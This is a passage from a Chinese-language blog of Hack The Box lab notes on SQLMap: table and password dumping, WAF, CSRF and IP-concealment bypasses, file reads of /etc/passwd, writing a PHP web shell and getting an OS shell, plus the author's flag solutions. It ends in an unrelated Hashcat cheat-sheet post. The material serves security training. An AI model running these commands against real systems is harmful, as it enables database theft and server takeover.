http://94.237.59.206:49992/case6.php?col=id  --batch --dump --prefix &#39;`)&#39; -D testdb -T flag6</code></pre><p> <strong>What’s the contents of table flag7? (Case #7 with adjustments)</strong></p><blockquote><p>Detect and exploit SQLi vulnerability in GET parameter <code>id</code> by usage of UNION query-based technique</p></blockquote><pre><code class="\">sqlmap -u http://94.237.59.206:49992/case7.php?id=1  --batch --dump -D testdb -T flag7 --union-cols=5</code></pre><h1 id="Database-Enumeration"><a href="#Database-Enumeration" class="headerlink" title="Database Enumeration"></a>Database Enumeration</h1><p>通常，在成功检测到SQLi漏洞后，我们可以开始枚举数据库中的基本细节，例如易受攻击目标的主机名（–hostname）、当前用户名（–current-user）、当前数据库名称（–current-db）或密码散列（–passwords）。SQLMap将跳过SQLi检测，如果它已经被早期识别，并直接启动DBMS枚举过程。 枚举通常从检索基本信息开始：</p><ul><li>数据库版本（switch <code>--banner</code>） </li><li>当前用户名（switch –current-user） </li><li>当前数据库名称（开关–current-db） </li><li>正在检查当前用户是否具有DBA（administrator）权限。</li></ul><p> 以下SQLMap命令可执行上述所有操作：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --banner --current-user --current-db --is-dba</code></pre><blockquote><p>注：在绝大多数情况下，数据库上下文中的“root”用户与操作系统用户“root”没有任何关系，而不是代表DBMS上下文中的特权用户。这基本上意味着数据库用户在数据库上下文中不应该有任何约束，而操作系统权限（例如，文件系统写入任意位置）应该是最小化的，至少在最近的部署中是这样。同样的原则也适用于一般的“DBA”角色。</p></blockquote><h2 id="Table-Enumeration"><a href="#Table-Enumeration" class="headerlink" title="Table Enumeration"></a>Table Enumeration</h2><p>在大多数常见的场景中，在找到当前数据库名称（即testdb）后，将通过使用–tables选项并使用-D testdb指定数据库名称来检索表名，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --tables -D testdb</code></pre><p>在发现感兴趣的表名后，可以通过使用–dump选项并使用-T用户指定表名来检索其内容，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb</code></pre><p>可以通过选项“–dump format”将输出格式指定为HTML或SQLite，这样我们以后就可以在SQLite环境中进一步研究DB了。</p><h2 id="Table-x2F-Row-Enumeration"><a href="#Table-x2F-Row-Enumeration" class="headerlink" title="Table&#x2F;Row Enumeration"></a>Table&#x2F;Row Enumeration</h2><p>当处理具有许多列和&#x2F;或行的大型表时，我们可以使用-C选项指定列（例如，仅名称和姓氏列），如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb -C name,surname</code></pre><p>要根据表中的序号缩小行的范围，我们可以使用–start和–stop选项指定行（例如，从第二个条目开始到第三个条目），如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb --start=2 --stop=3</code></pre><h2 id="Conditional-Enumeration"><a href="#Conditional-Enumeration" class="headerlink" title="Conditional Enumeration"></a>Conditional Enumeration</h2><p>如果需要根据已知的WHERE条件检索某些行（例如name LIKE“f%”），我们可以使用选项–WHERE，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -T users -D testdb --where=&quot;name LIKE &#39;f%&#39;&quot;</code></pre><h2 id="Full-DB-Enumeration"><a href="#Full-DB-Enumeration" class="headerlink" title="Full DB Enumeration"></a>Full DB Enumeration</h2><p>我们可以通过完全跳过选项-T（例如-dump-D testdb）的使用来检索感兴趣的数据库中的所有表，而不是基于单个表检索内容。只需使用开关-dump而不指定带-T的表，就可以检索到所有当前的数据库内容。至于–dump-all开关，将检索所有数据库中的所有内容。 在这种情况下，还建议用户包括开关-exclude sysdbs（例如-dump-all-exclude sysdb），这将指示SQLMap跳过从系统数据库中检索内容，因为它通常对Pentester不太感兴趣。</p><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><p> <strong>What’s the contents of table flag1 in the testdb database? (Case #1)</strong></p><pre><code>sqlmap -u http://94.237.59.206:49992/case1.php?id=1  --batch --dump -D testdb -T flag1 </code></pre><h1 id="Advanced-Database-Enumeration"><a href="#Advanced-Database-Enumeration" class="headerlink" title="Advanced Database Enumeration"></a>Advanced Database Enumeration</h1><h2 id="DB-Schema-Enumeration"><a href="#DB-Schema-Enumeration" class="headerlink" title="DB Schema Enumeration"></a>DB Schema Enumeration</h2><p>如果我们想检索所有表的结构，以便对数据库体系结构有一个完整的概述，我们可以使用switch –schema：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --schema</code></pre><h2 id="Searching-for-Data"><a href="#Searching-for-Data" class="headerlink" title="Searching for Data"></a>Searching for Data</h2><p>当处理具有大量表和列的复杂数据库结构时，我们可以使用–search选项搜索感兴趣的数据库、表和列。此选项使我们能够使用LIKE运算符搜索标识符名称。例如，如果我们正在查找包含关键字user的所有表名，我们可以按如下方式运行SQLMap：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --search -T user</code></pre><p>在上面的例子中，我们可以根据这些搜索结果立即发现几个有趣的数据检索目标。我们还可以尝试根据特定关键字搜索所有列名（例如pass）：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --search -C pass</code></pre><h2 id="Password-Enumeration-and-Cracking"><a href="#Password-Enumeration-and-Cracking" class="headerlink" title="Password Enumeration and Cracking"></a>Password Enumeration and Cracking</h2><p>一旦我们识别出一个包含密码的表（例如master.users），我们就可以使用-T选项检索该表，如前所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --dump -D master -T users</code></pre><h2 id="DB-Users-Password-Enumeration-and-Cracking"><a href="#DB-Users-Password-Enumeration-and-Cracking" class="headerlink" title="DB Users Password Enumeration and Cracking"></a>DB Users Password Enumeration and Cracking</h2><p>除了在数据库表中找到的用户凭据之外，我们还可以尝试转储包含数据库特定凭据（例如，连接凭据）的系统表的内容。为了简化整个过程，SQLMap有一个特殊的开关——专门为这样的任务设计的–passwords：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --passwords --batch</code></pre><h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><p><strong>What’s the name of the column containing “style” in it’s name? (Case #1)</strong></p><pre><code>sqlmap -u http://94.237.59.206:49992/case1.php?id=1  --search -C style </code></pre><p><strong>What’s the Kimberly user’s password? (Case #1)</strong></p><pre><code>sqlmap -u http://94.237.59.206:49992/case1.php?id=1  -D testdb -T users -C name,password --dump</code></pre><p>这里我想着用–where或者–search，但是发现好像搞不了。。。</p><h1 id="Bypassing-Web-Application-Protections"><a href="#Bypassing-Web-Application-Protections" class="headerlink" title="Bypassing Web Application Protections"></a>Bypassing Web Application Protections</h1><h2 id="Anti-CSRF-Token-Bypass"><a href="#Anti-CSRF-Token-Bypass" class="headerlink" title="Anti-CSRF Token Bypass"></a>Anti-CSRF Token Bypass</h2><p>防止使用自动化工具的第一道防线是将反CSRF（即跨站点请求伪造）令牌合并到所有HTTP请求中，尤其是那些由于web表单填写而生成的请求。 在最基本的术语中，只有当用户实际访问并使用了页面时，这种场景中的每个HTTP请求才应该有一个（有效的）令牌值。虽然最初的想法是防止出现恶意链接的情况，在这种情况下，仅仅打开这些链接就会对不知情的登录用户产生不希望的后果（例如，打开管理员页面并添加具有预定义凭据的新用户），但这一安全功能也无意中强化了应用程序以抵御（不希望的）自动化。 尽管如此，SQLMap有一些选项可以帮助绕过反CSRF保护。也就是说，最重要的选项是–csrf-token。通过指定令牌参数名称（在提供的请求数据中应该已经可用），SQLMap将自动尝试解析目标响应内容并搜索新的令牌值，以便在下一个请求中使用它们。 此外，即使在用户没有通过–csrf-token明确指定令牌名称的情况下，如果提供的参数之一包含任何常见的中缀（即csrf、xsrf、token），用户也会在进一步的请求中被提示是否更新它：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/&quot; --data=&quot;id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&quot; --csrf-token=&quot;csrf-token&quot;</code></pre><h2 id="Unique-Value-Bypass"><a href="#Unique-Value-Bypass" class="headerlink" title="Unique Value Bypass"></a>Unique Value Bypass</h2><p>在某些情况下，web应用程序可能只需要在预定义的参数内提供唯一的值。这种机制类似于上述的反CSRF技术，不同之处在于不需要解析网页内容。因此，通过简单地确保每个请求都有一个预定义参数的唯一值，web应用程序可以很容易地阻止CSRF尝试，同时避免一些自动化工具。为此，应使用选项–randomize，指向包含在发送之前应随机化的值的参数名称：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&amp;rp=29125&quot; --randomize=rp --batch -v 5 | grep URIURI: http://www.example.com:80/?id=1&amp;rp=99954URI: http://www.example.com:80/?id=1&amp;rp=87216URI: http://www.example.com:80/?id=9030&amp;rp=36456URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&amp;rp=16689URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&amp;rp=40049URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&amp;rp=95185</code></pre><h2 id="Calculated-Parameter-Bypass"><a href="#Calculated-Parameter-Bypass" class="headerlink" title="Calculated Parameter Bypass"></a>Calculated Parameter Bypass</h2><p>另一种类似的机制是web应用程序期望基于一些其他参数值来计算适当的参数值。通常情况下，一个参数值必须包含另一个参数的消息摘要（例如h&#x3D;MD5（id））。要绕过这一点，应该使用–eval选项，其中在将请求发送到目标之前对有效的Python代码进行评估：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib; h=hashlib.md5(id).hexdigest()&quot; --batch -v 5 | grep URIURI: http://www.example.com:80/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849bURI: http://www.example.com:80/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849bURI: http://www.example.com:80/?id=9061&amp;h=4d7e0d72898ae7ea3593eb5ebf20c744URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&amp;h=620460a56536e2d32fb2f4842ad5a08dURI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&amp;h=db7c815825b14d67aaa32da09b8b2d42URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&amp;h=02312acd4ebe69e2528382dfff7fc5cc</code></pre><h2 id="IP-Address-Concealing"><a href="#IP-Address-Concealing" class="headerlink" title="IP Address Concealing"></a>IP Address Concealing</h2><p>如果我们想隐藏我们的IP地址，或者某个网络应用程序有将我们当前的IP地址列入黑名单的保护机制，我们可以尝试使用代理或匿名网络Tor。可以使用选项–proxy设置代理（例如–proxy&#x3D;“socks4:&#x2F;&#x2F;177.39.187.70:33283”），我们应该在其中添加一个工作代理。 除此之外，如果我们有一个代理列表，我们可以通过选项–proxy-file将它们提供给SQLMap。这样，SQLMap将按顺序遍历列表，如果出现任何问题（例如，IP地址被列入黑名单），它将从列表中从当前跳到下一个。另一种选择是使用Tor网络来提供易于使用的匿名化，我们的IP可以出现在Tor出口节点的大列表中的任何位置。在本地计算机上正确安装后，本地端口9050或9150上应该有SOCKS4代理服务。通过使用开关–tor，SQLMap将自动尝试查找本地端口并适当地使用它。 如果我们想确保Tor被正确使用，以防止不必要的行为，我们可以使用开关——check Tor。在这种情况下，SQLMap将连接到<a href="https://check.torproject.org/%E5%B9%B6%E6%A3%80%E6%9F%A5%E5%93%8D%E5%BA%94%E7%9A%84%E9%A2%84%E6%9C%9F%E7%BB%93%E6%9E%9C%EF%BC%88%E5%8D%B3%EF%BC%8C%E7%A5%9D%E8%B4%BA%E5%87%BA%E7%8E%B0%E5%9C%A8%E9%87%8C%E9%9D%A2%EF%BC%89%E3%80%82">https://check.torproject.org/并检查响应的预期结果（即，祝贺出现在里面）。</a></p><h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><p>每当我们运行SQLMap时，作为初始测试的一部分，SQLMap都会使用不存在的参数名称（例如？pfov&#x3D;…）发送一个预定义的恶意负载，以测试WAF（Web应用程序防火墙）的存在。在用户和目标之间存在任何保护的情况下，与原始响应相比，响应将发生实质性变化。例如，如果实现了最流行的WAF解决方案之一（ModSecurity），那么在这样的请求之后应该会有一个406-不可接受的响应。为了识别实际的保护机制，SQLMap使用第三方库 <a href="https://github.com/stamparm/identYwaf">identYwaf</a>，其中包含80种不同WAF解决方案的签名。如果我们想完全跳过这个启发式测试（即，产生更少的噪声），我们可以使用switch –skip-waf。</p><h2 id="User-agent-Blacklisting-Bypass"><a href="#User-agent-Blacklisting-Bypass" class="headerlink" title="User-agent Blacklisting Bypass"></a>User-agent Blacklisting Bypass</h2><p>如果在运行SQLMap时出现即时问题（例如，从一开始就出现HTTP错误代码5XX），我们首先应该考虑的是SQLMap使用的默认用户代理（例如，用户代理：SQLMap&#x2F;1.4.9(<a href="http://sqlmap.org))./">http://sqlmap.org))。</a> 使用开关-随机代理绕过这一点很简单，它使用从浏览器使用的大量值中随机选择的值来更改默认用户代理。</p><blockquote><p>注意：如果在运行过程中检测到某种形式的保护，我们可能会发现目标出现问题，甚至其他安全机制也会出现问题。主要原因是这种保护的不断发展和新的改进，给攻击者留下了越来越小的机动空间。</p></blockquote><h2 id="Tamper-Scripts"><a href="#Tamper-Scripts" class="headerlink" title="Tamper Scripts"></a>Tamper Scripts</h2><p>最后，在SQLMap中实现的绕过WAF&#x2F;IPS解决方案的最流行的机制之一是所谓的“篡改”脚本。篡改脚本是一种特殊的（Python）脚本，用于在将请求发送到目标之前修改请求，在大多数情况下是为了绕过一些保护。 例如，之间最流行的篡改脚本之一是将所有出现的大于运算符（&gt;）替换为NOT between 0 AND#，将等于运算符（&#x3D;）替换为between#AND#。通过这种方式，许多基本的保护机制（主要集中在防止XSS攻击）很容易被绕过，至少对于SQLi来说是这样。 篡改脚本可以一个接一个地链接在–Tamper选项中（例如–Tamper&#x3D;between，randomcase），在那里它们根据预定义的优先级运行。优先级是预先定义的，以防止任何不需要的行为，因为一些脚本通过修改其SQL语法来修改有效负载（例如ifnull2ifisull）。相反，一些篡改脚本并不关心内部内容（例如appendnullbyte）。 篡改脚本可以修改请求的任何部分，尽管大多数都会更改负载内容。</p><p>为了获得实现的篡改脚本的完整列表，以及上面的描述，可以使用 <code>--list-tampers</code> 。我们还可以为任何自定义类型的攻击开发自定义篡改脚本，比如二阶SQLi。</p><h2 id="Miscellaneous-Bypasses"><a href="#Miscellaneous-Bypasses" class="headerlink" title="Miscellaneous Bypasses"></a>Miscellaneous Bypasses</h2><p>在其他保护旁路机制中，还有两个机制需要提及。第一个是Chunked传输编码，使用开关Chunked打开，它将POST请求的主体拆分为所谓的“chunk”。列入黑名单的SQL关键字在chunk之间进行拆分，这样包含它们的请求就可以被忽略。 另一种绕过机制是HTTP参数污染（HPP），其中有效载荷以与情况类似的方式进行拆分——在不同的相同参数命名值之间分块（例如<code>？id=1&amp;id=UNION&amp;id=SELECT&amp;id=username，password&amp;id=FROM&amp;id=users…</code>），如果支持，则由目标平台连接（例如ASP）。</p><h2 id="practice-4"><a href="#practice-4" class="headerlink" title="practice"></a>practice</h2><p><strong>What’s the contents of table flag8? (Case #8 anti-CSRF token bypass)</strong></p><pre><code>sqlmap -u http://94.237.59.206:37390/case8.php --method POST --data &quot;id=1&amp;t0ken=2W13oyiefGY3lbZnUMqJytlCObM4kGlfTzigcsr50&quot; --csrf-token=&quot;t0ken&quot; --cookie=&quot;PHPSESSID=cv17jl24lbh9ohmg70nsm48t4v&quot; -D testdb -T flag8 --dump</code></pre><p>需要去查看相关的负载和cookie</p><p><strong>What’s the contents of table flag9? (Case #9 What’s the contents of table flag9? (Case #9))</strong></p><pre><code>sqlmap -u &#39;http://94.237.60.119:58978/case9.php?id=1&amp;uid=753674357&#39; --randomize=&quot;uid&quot; -D testdb -T flag9 --dump</code></pre><p><strong>What’s the contents of table flag10? (Case #10-Primitive protection )</strong></p><p>这里正常payload一跑就出错，可能是用户代理有问题，根据报错提示加了一个<code>--random-agent</code>:</p><pre><code>sqlmap -u &#39;http://94.237.60.119:58978/case10.php&#39; --method POST --data &quot;id=1&quot; -D testdb -T flag10 --dump --random-agent</code></pre><p>这里其实把包写在文档中使用<code>-r</code>也可以直接注入</p><p> <strong>What’s the contents of table flag11? (Case #11 Filtering of characters ‘&lt;’, ‘&gt;’)</strong></p><p>着里按照题目提示会过滤两个符号，应该要用到Tamper脚本，先使用<code>--list-tampers</code>查找一下</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307141924212.png" alt="image-20230714192407146"></p><p>应该只能是这个脚本了，虽然根据描述它没有修改‘&lt;’</p><pre><code>sqlmap -u http://94.237.60.119:58978/case11.php?id=1 -D testdb -T flag11 --tamper=between --dump</code></pre><h1 id="OS-Exploitation"><a href="#OS-Exploitation" class="headerlink" title="OS Exploitation"></a>OS Exploitation</h1><p>SQLMap能够利用SQL注入从DBMS外部的本地系统读取和写入文件。如果我们有适当的权限，SQLMap还可以尝试在远程主机上直接执行命令。</p><h2 id="File-Read-x2F-Write"><a href="#File-Read-x2F-Write" class="headerlink" title="File Read&#x2F;Write"></a>File Read&#x2F;Write</h2><p>通过SQL注入漏洞进行操作系统攻击的第一部分是在托管服务器上读取和写入数据。读取数据比写入数据要常见得多，写入数据在现代数据库管理系统中具有严格的特权，因为它可能会导致系统利用，正如我们将看到的那样。例如，在MySql中，要读取本地文件，DB用户必须具有LOAD DATA和INSERT的权限，才能将文件的内容加载到表中，然后读取该表。 此类命令的一个示例是：</p><ul><li><code>LOAD DATA LOCAL INFILE &#39;/etc/passwd&#39; INTO TABLE passwd;</code></li></ul><h2 id="Checking-for-DBA-Privileges"><a href="#Checking-for-DBA-Privileges" class="headerlink" title="Checking for DBA Privileges"></a>Checking for DBA Privileges</h2><p>要检查我们是否具有SQLMap的DBA权限，我们可以使用–is-DBA选项：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/case1.php?id=1&quot; --is-dba...SNIP...current user is DBA: False</code></pre><h2 id="Reading-Local-Files"><a href="#Reading-Local-Files" class="headerlink" title="Reading Local Files"></a>Reading Local Files</h2><p>与通过SQLi手动注入上述行不同，SQLMap使用–file read选项使读取本地文件变得相对容易：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-read &quot;/etc/passwd&quot;...SNIP...[17:40:14] [INFO] the local file &#39;~/.sqlmap/output/www.example.com/files/_etc_passwd&#39; and the remote file &#39;/etc/passwd&#39; have the same size (982 B)files saved to [1]:[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)</code></pre><p>正如我们所看到的，SQLMap说文件保存到本地文件。我们可以对本地文件进行cat以查看其内容</p><h2 id="Writing-Local-Files"><a href="#Writing-Local-Files" class="headerlink" title="Writing Local Files"></a>Writing Local Files</h2><p>当它向托管服务器写入文件时，在现代DMBS中变得更加受限，因为我们可以利用它在远程服务器上编写Web Shell，从而执行代码并接管服务器。 这就是为什么现代DBMS默认情况下禁用文件写入，并且需要DBA的某些权限才能写入文件。例如，在MySql中，必须手动禁用–secure file priv配置，以允许使用into OUTFILE SQL查询将数据写入本地文件，此外还需要主机服务器上的任何本地访问权限，如在我们需要的目录中写入的权限。 尽管如此，许多web应用程序都要求DBMS能够将数据写入文件，因此值得测试我们是否可以将文件写入远程服务器。要使用SQLMap做到这一点，我们可以使用–file write和–file dest选项。首先，让我们准备一个基本的PHP web shell，并将其写入shell.PHP文件.</p><p>现在，让我们尝试在远程服务器上的&#x2F;var&#x2F;www&#x2F;html&#x2F;目录中编写此文件，该目录是Apache的默认服务器webroot。如果我们不知道服务器webroot，我们将看到SQLMap如何自动找到它。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-write &quot;shell.php&quot; --file-dest &quot;/var/www/html/shell.php&quot;</code></pre><h2 id="OS-Command-Execution"><a href="#OS-Command-Execution" class="headerlink" title="OS Command Execution"></a>OS Command Execution</h2><p>现在我们确认了我们可以编写一个PHP shell来执行命令，我们可以测试SQLMap的能力，它可以为我们提供一个简单的操作系统shell，而无需手动编写远程shell。SQLMap利用各种技术通过SQL注入漏洞获取远程shell，比如像我们刚才所做的那样编写远程shell，编写执行命令和检索输出的SQL函数，甚至使用一些直接执行OS命令的SQL查询，比如Microsoft SQL Server中的xp_cmdshell。要获得带有SQLMap的操作系统外壳，我们可以使用–OS-shell选项，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --os-shell...SNIP...[18:02:37] [INFO] the local file &#39;/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so&#39; and the remote file &#39;./libslpjs.so&#39; have the same size (8040 B)[18:02:37] [INFO] creating UDF &#39;sys_exec&#39; from the binary UDF file[18:02:38] [INFO] creating UDF &#39;sys_eval&#39; from the binary UDF file[18:02:39] [INFO] going to use injected user-defined functions &#39;sys_eval&#39; and &#39;sys_exec&#39; for operating system command execution[18:02:39] [INFO] calling Linux OS shell. To quit type &#39;x&#39; or &#39;q&#39; and press ENTERos-shell&gt; ls -lado you want to retrieve the command standard output? [Y/n/a] a[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION techniqueNo output</code></pre><p>我们看到SQLMap默认使用UNION技术来获得操作系统外壳，但最终未能给我们任何输出No output。因此，正如我们已经知道的那样，我们有多种类型的SQL注入漏洞，让我们尝试指定另一种更有可能为我们提供直接输出的技术，如基于错误的SQL注入，我们可以用–technique&#x3D;E指定它：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --os-shell --technique=E</code></pre><h2 id="practice-5"><a href="#practice-5" class="headerlink" title="practice"></a>practice</h2><p><strong>Try to use SQLMap to read the file “&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt”.</strong></p><pre><code>sqlmap -u http://94.237.50.62:39989/?id=1 --file-read &quot;/var/www/html/flag.txt&quot;</code></pre><p>（既然要拿到shell那么这一步好像没啥必要）</p><p><strong>Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.</strong></p><pre><code>sqlmap -u http://94.237.50.62:39989/?id=1 --os-shell</code></pre><p>这里加一个<code>--technique=E</code>应该能够更加丝滑地拿到shell；拿到shell之后目录是锁定的，只能find检索一下flag位置然后直接读取</p><h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1><p>您可以访问具有基本保护机制的web应用程序。使用本模块中学习的技能，通过SQLMap查找SQLi漏洞并进行相应的攻击。要完成此模块，请找到标志并在此处提交。</p><blockquote><p>target:83.136.253.168:50653</p><p>What’s the contents of table final_flag?</p></blockquote><p>在网页上浏览，在blog目录中看到了一个查询接口，本章讲的是sqli那么漏洞应该就是这里了（有点取巧了bushi），但是发现没什么反应乌鱼子只能找找其他地方</p><p>突然发现有一个POST包，应该是点击加入购物车触发的，它发送了一个json文件</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307142024688.png" alt="image-20230714202432615"></p><p>用这个包打打看，先直接看看能不能拿到shell</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307142035598.png" alt="image-20230714203535534"></p><p>这里显示有防火墙或者一些过滤规则，让程序接着跑一会，再开一个窗口试试常规的数据库检索，万一flag在数据库里呢？</p><p>但是发现一样的卡住了，这里怎么说呢，还是只能取巧试一试之前的绕过方式，在之前的文档中用到的tamper这里也拥有一下（一般而言这个模块是这样的）……然后就好家伙，用between报错了没了hh~</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151001412.png" alt="image-20230715100131257">回显上两次提到了time-base，可以设定注入技术为T（technique&#x3D;T)，因为在mysql里拿到了库名，可以直接指定dbms&#x3D;Mysql</p><p>最终的payload长这样：</p><pre><code>sqlmap -r test.txt -D production -T final_flag --tamper=between --dbms=Mysql --technique=T --dump --no-cast</code></pre><p>如果不加–no-cast或者–hex可能回显blank：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151019524.png" alt="image-20230715101944473"></p><p>使用–no-cast后拿到flag：</p><p>这里补充一下为什么会用到tamper&#x3D;between</p><p>先正常-r</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151010044.png"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151011530.png" alt="image-20230715101140449"></p><p>事实上，我用它提示的脚本也拿到了结果，但是根据回显使用更准确的脚本会节约时间</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;GET-x2F-POST-Requests&quot;&gt;&lt;a href=&quot;#GET-x2F-POST-Requests&quot; class=&quot;headerlink&quot; title=&quot;GET&amp;#x2F;POST Requests&quot;&gt;&lt;/a&gt;GET&amp;#x2F;POST Requests&lt;/h2&gt;&lt;p&gt;在最常见的场景中，GET参数使用选项-u&amp;#x2F;-url提供，如前一个示例所示。对于测试POST数据，可以使用–data标志，如下所示：&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="tool" scheme="https://taninluv.github.io/tags/tool/"/>
    
  </entry>
  
  <entry>
    <title>CRACKING PASSWORDS WITH HASHCAT</title>
    <link href="https://taninluv.github.io/2023/07/12/CRACKING-PASSWORDS-WITH-HASHCAT/"/>
    <id>https://taninluv.github.io/2023/07/12/CRACKING-PASSWORDS-WITH-HASHCAT/</id>
    <published>2023-07-12T02:00:49.000Z</published>
    <updated>2023-07-13T07:35:01.728Z</updated>
    
    <content type="html"><![CDATA[<p>哈希是将某些文本转换为字符串的过程，该字符串对于特定文本是唯一的。通常，散列函数总是返回具有相同长度的散列，而与数据的类型、长度或大小无关。哈希是一个单向过程，这意味着无法从哈希中重建原始明文。</p><span id="more"></span><h5 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h5><p>备忘单是此模块的有用命令参考。</p><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>pip install hashid</code></td><td>安装该工具<code>hashid</code></td></tr><tr><td><code>hashid &lt;hash&gt;</code>或<code>hashid &lt;hashes.txt&gt;</code></td><td>使用该工具识别哈希<code>hashid</code></td></tr><tr><td><code>hashcat --example-hashes</code></td><td>查看哈希模式和示例哈希的列表<code>Hashcat</code></td></tr><tr><td><code>hashcat -b -m &lt;hash mode&gt;</code></td><td>执行特定哈希模式的基准测试<code>Hashcat</code></td></tr><tr><td><code>hashcat -b</code></td><td>执行所有哈希模式的基准测试</td></tr><tr><td><code>hashcat -O</code></td><td>优化：提高速度，但限制潜在的密码长度</td></tr><tr><td><code>hashcat -w 3</code></td><td>优化：当 Hashcat 是唯一正在运行的东西时使用，如果在桌面上运行 hashcat，则使用 1。默认值为 2</td></tr><tr><td><code>hashcat -a 0 -m &lt;hash type&gt; &lt;hash file&gt; &lt;wordlist&gt;</code></td><td>字典攻击</td></tr><tr><td><code>hashcat -a 1 -m &lt;hash type&gt; &lt;hash file&gt; &lt;wordlist1&gt; &lt;wordlist2&gt;</code></td><td>组合攻击</td></tr><tr><td><code>hashcat -a 3 -m 0 &lt;hash file&gt; -1 01 &#39;ILFREIGHT?l?l?l?l?l20?1?d&#39;</code></td><td>样本掩码攻击</td></tr><tr><td><code>hashcat -a 7 -m 0 &lt;hash file&gt; -1=01 &#39;20?1?d&#39; rockyou.txt</code></td><td>混合攻击示例</td></tr><tr><td><code>crunch &lt;minimum length&gt; &lt;maximum length&gt; &lt;charset&gt; -t &lt;pattern&gt; -o &lt;output file&gt;</code></td><td>制作单词列表<code>Crunch</code></td></tr><tr><td><code>python3 cupp.py -i</code></td><td>使用交互模式<code>CUPP</code></td></tr><tr><td><code>kwp -s 1 basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route</code></td><td><code>Kwprocessor</code>例</td></tr><tr><td><code>cewl -d &lt;depth to spider&gt; -m &lt;minimum word length&gt; -w &lt;output wordlist&gt; &lt;url of website&gt;</code></td><td>示例命令<code>CeWL</code></td></tr><tr><td><code>hashcat -a 0 -m 100 hash rockyou.txt -r rule.txt</code></td><td>示例规则语法<code>Hashcat</code></td></tr><tr><td><code>./cap2hccapx.bin input.cap output.hccapx</code></td><td><code>cap2hccapx</code>语法</td></tr><tr><td><code>hcxpcaptool -z pmkidhash_corp cracking_pmkid.cap</code></td><td><code>hcxpcaptool</code>语法</td></tr></tbody></table><p>有时，散列以特定的格式存储。例如，&#x3D;&#x3D;hash:salt&#x3D;&#x3D;或&#x3D;&#x3D;$id$salt$hash&#x3D;&#x3D;。 哈希2fc5a684737ce1bf7b3b239df432416e0dd07357:2014是一个2014年的SHA1哈希。 